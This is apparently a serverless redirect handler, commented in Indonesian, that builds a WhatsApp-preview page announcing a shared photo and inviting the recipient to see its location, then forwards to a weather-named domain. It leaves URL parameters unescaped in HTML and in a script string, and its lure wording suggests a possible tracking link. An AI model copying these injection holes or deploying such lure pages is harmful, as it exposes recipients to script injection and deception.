export default function handler(req, res) {
  // 1. Ambil parameter dari URL
  const queryString = req.url.split('?')[1] || '';
  const params = {};
  queryString.split('&').forEach(param => {
    const [key, value] = param.split('=');
    if (key && value) {
      params[key] = decodeURIComponent(value);
    }
  });

  const foto = params.foto;
  const lat = params.lat;
  const lng = params.lng;
  const user = params.u || 'images';
  const nama = params.nama || '';

  // 2. Jika tidak ada foto, tampilkan error
  if (!foto) {
    return res.status(400).send(`
      <html>
        <body style="font-family: sans-serif; text-align: center; padding: 50px; background: #111; color: #fff;">
          <h1>Link Tidak Valid</h1>
          <p>Foto tidak ditemukan di link ini.</p>
        </body>
      </html>
    `);
  }

  // 3. Bangun URL redirect ke view.html
  let redirectUrl = 'https://infocuaca.online/view.html?foto=' + encodeURIComponent(foto) + '&u=' + encodeURIComponent(user);
  
  if (lat) redirectUrl += '&lat=' + lat;
  if (lng) redirectUrl += '&lng=' + lng;
  if (nama) redirectUrl += '&nama=' + encodeURIComponent(nama);

  // 4. Tampilkan HTML dengan Meta Tag Open Graph (untuk preview WhatsApp)
  // Lalu redirect ke view.html via JavaScript setelah delay
  const html = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Foto Dibagikan</title>

<!-- ═══ META TAG OPEN GRAPH UNTUK PREVIEW WHATSAPP ═══ -->
<meta property="og:title" content="Foto Dibagikan" />
<meta property="og:description" content="Seseorang membagikan foto kepada Anda. Klik untuk melihat lokasinya." />
<meta property="og:image" content="${foto}" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:type" content="image/jpeg" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="infocuaca.online" />

<!-- ═══ META TAG TWITTER CARD ═══ -->
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Foto Dibagikan" />
<meta name="twitter:description" content="Seseorang membagikan foto kepada Anda. Klik untuk melihat lokasinya." />
<meta name="twitter:image" content="${foto}" />

<style>
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; background: #111; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .container { text-align: center; padding: 20px; max-width: 500px; width: 100%; }
  img { max-width: 100%; height: auto; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); margin-bottom: 20px; }
  .loading { font-size: 14px; color: #888; letter-spacing: 2px; }
</style>

<!-- ═══ REDIRECT VIA JAVASCRIPT (SETELAH META TAG DIBACA) ═══ -->
<script>
  // Redirect ke view.html setelah halaman dimuat
  // Menggunakan setTimeout 300ms agar WhatsApp sempat membaca meta tag
  setTimeout(function() {
    window.location.href = "${redirectUrl}";
  }, 300);
</script>

</head>
<body>
  <div class="container">
    <img src="${foto}" alt="Foto Dibagikan">
    <div class="loading">Mengalihkan...</div>
  </div>
</body>
</html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.status(200).send(html);
}
